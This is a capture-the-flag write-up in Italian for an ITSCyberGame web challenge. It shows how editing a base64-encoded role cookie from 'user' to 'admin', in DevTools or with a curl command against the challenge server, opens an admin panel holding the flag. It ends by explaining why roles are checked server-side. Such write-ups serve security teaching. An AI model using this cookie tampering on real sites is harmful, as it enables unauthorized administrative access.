# Il Piccolo Negozio Online

**Competizione:** ITSCyberGame<br>
**Categoria:** Web<br>
**Connessione:** `sfide.itscybergame.it:<numero_porta>`

---

## Descrizione

> In questo negozio ci saranno anche pochi articoli, ma ti assicuro che sono tutti di un'INESTIMABILE valore.

---

## Soluzione

### Passo 1 — Ricognizione del sorgente

Aprendo il negozio e guardando il sorgente HTML si nota subito un commento nascosto:

```html
<div style="display:none">
  <!-- TODO: Access admin.php (solo se role=admin) -->
</div>
```

Esiste quindi una pagina `/admin.php` accessibile solo agli utenti con ruolo `admin`.

### Passo 2 — Analisi dei Cookie

Aprendo il DevTools del browser (**F12 → Application → Cookies**) si osservano i cookie di sessione. Sia i nomi che i valori sono codificati in **Base64**:

| Cookie name (base64) | Decodificato | Cookie value (base64) | Decodificato |
|---|---|---|---|
| `cm9sZQ==` | `role` | `dXNlcg==` | `user` |
| `dXNlcm5hbWU=` | `username` | *(valore utente)* | *(nome utente)* |

Il server non fa nessuna verifica server-side del ruolo, si fida ciecamente del valore del cookie.

### Passo 3 — Cookie tampering

Basta modificare il valore del cookie `cm9sZQ==` da `dXNlcg==` (`user`) a `YWRtaW4=` (`admin`):

```
base64("role")  = cm9sZQ==
base64("admin") = YWRtaW4=
```

Dal DevTools si modifica direttamente il valore del cookie, oppure con curl:

```bash
curl -s http://sfide.itscybergame.it:17191/admin.php \
  -b "cm9sZQ===YWRtaW4="
```

### Passo 4 — Accesso al pannello admin

Navigando su `/admin.php` con il cookie modificato, il server accetta il ruolo e mostra il pannello di amministrazione:

```
Pannello di Amministrazione
Benvenuto, User (ruolo: admin)
FLAG: flag{...}
```

---

## Conclusioni

La challenge dimostra il pericolo di **affidarsi ai cookie client-side per il controllo degli accessi**. Codificare in Base64 non è crittografia: è solo una codifica reversibile, leggibile da chiunque apra il DevTools. Il ruolo dell'utente va sempre verificato server-side tramite sessioni gestite dal server, non tramite valori controllabili dal client.